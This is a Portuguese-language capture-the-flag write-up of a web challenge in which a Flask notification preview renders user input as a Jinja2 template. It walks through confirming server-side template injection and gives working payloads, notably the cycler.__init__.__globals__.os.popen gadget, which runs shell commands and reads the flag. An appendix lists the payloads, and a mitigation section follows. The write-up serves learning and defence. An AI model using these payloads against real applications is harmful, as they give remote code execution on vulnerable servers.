<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=The+HR+Model" alt="Typing SVG" /></a>

</div>

# The HR Model — WEB · 🔴 DIFÍCIL

- **Status:** ✅ RESOLVIDO — SSTI Jinja2 (Flask) no preview de notificações → RCE → leitura da flag.
- **Pontos:** 150 (dinâmico) · author Perceval
- **Alvo:** `modele-du-drh.cyberzerk.fr`
- **Enunciado:** *"The HR manager previews his notifications; the entered model is rendered as is. Get the flag."*
- **Flag:** `CyberZerk{SSTI_j1nj4_rc3_d3puis_un_m0d3l3_d3_c0ng3}`

---

## TL;DR

1. Formulário "MODELE DE NOTIFICATION" renderiza o `message` enviado **tel quel**, com sintaxe `{{ nom }}` — assinatura de Jinja2/Flask.
2. A entrada é avaliada como **template** no servidor (não como dado): `{{7*7}}` → `49`. Isso é **SSTI**, não XSS.
3. Gadget Jinja2 estável `cycler.__init__.__globals__.os.popen(...).read()` dá RCE → `cat` da flag.

## Análise

### 1. Reconhecimento

O campo renderiza o template do usuário e o próprio placeholder sugere interpolação de variáveis (`Bonjour {{ nom }}`). A nota na tela — *"le gabarit est rendu tel quel, plus simple pour les variables `{{ nom }}`"* — confirma que a entrada passa por um motor de template no backend.

### 2. Confirmar o motor (SSTI ≠ XSS)

| Entrada | APERCU RENDU | Conclusão |
|---|---|---|
| `Bonjour {{ 7*7 }}` | `Bonjour 49` | servidor **avaliou** a expressão ⇒ SSTI |
| `Bonjour {{ 7*'7' }}` | `Bonjour 7777777` | multiplicação string×int ⇒ **Jinja2 (Python)**, não Twig (que daria `49`) |

O teste decisivo é o `{{7*7}}`. Num XSS refletido a string voltaria **literal** (`{{7*7}}`) e o perigo só existiria se o *navegador* interpretasse `<script>`. Aqui o `49` chegou já calculado: quem executou foi o Python do Flask, no servidor.

### 3. Escalada SSTI → RCE

Sem `SandboxedEnvironment`, a introspecção do Python permite subir de qualquer objeto do contexto até o módulo `os`:

```
cycler            objeto built-in do Jinja2 (sempre presente)
 .__init__        método construtor (um objeto função)
 .__globals__     dict de globais do módulo onde __init__ nasceu → contém os
 .os.popen('id') executa comando no shell
 .read()          lê a saída de volta pro template
```

Prova de execução:

```jinja
Bonjour {{ cycler.__init__.__globals__.os.popen('id').read() }}
```
→ `Bonjour uid=10001(player) gid=10001(player) groups=10001(player)`

### 4. Leitura da flag

```jinja
Bonjour {{ cycler.__init__.__globals__.os.popen('cat flag* /flag* /app/flag* 2>/dev/null; ls -la').read() }}
```

A saída trouxe a flag `CyberZerk{...}` no bloco APERCU RENDU.

## O que não funcionou

| Hipótese | Resultado | Por quê |
|---|---|---|
| XSS refletido | ✗ | `{{7*7}}` não voltou literal — virou `49`. Avaliação no servidor = SSTI, não execução de JS no cliente. |
| Twig (PHP) | ✗ | `{{7*'7'}}` deu `7777777` (concatenação numérica do Python), não `49`. Confirma Jinja2/Python. |

## Conclusão

`render_template_string` (ou equivalente) sobre entrada do usuário, sem sandbox, transforma um "preview" inofensivo em RCE. A correção é tratar a entrada como **dado**, nunca como template: `render_template("notif.html", nom=user_input)`, ou um `SandboxedEnvironment` com os gadgets de introspecção bloqueados.

### Mitigação

- Nunca renderizar input do usuário como template (`render_template_string(user_input)` é o anti-padrão).
- Passar valores por contexto (`{{ nom }}` no arquivo de template, `nom=` no render).
- Se o usuário precisa mesmo fornecer template: `jinja2.sandbox.SandboxedEnvironment` + allowlist de atributos.

---

## Apêndice — payloads

```jinja
{{ 7*7 }}                                                       # confirma motor → 49
{{ 7*'7' }}                                                     # Jinja2 vs Twig → 7777777
{{ cycler.__init__.__globals__.os.popen('id').read() }}        # prova de RCE
{{ cycler.__init__.__globals__.os.popen('cat flag*').read() }} # leitura da flag
```
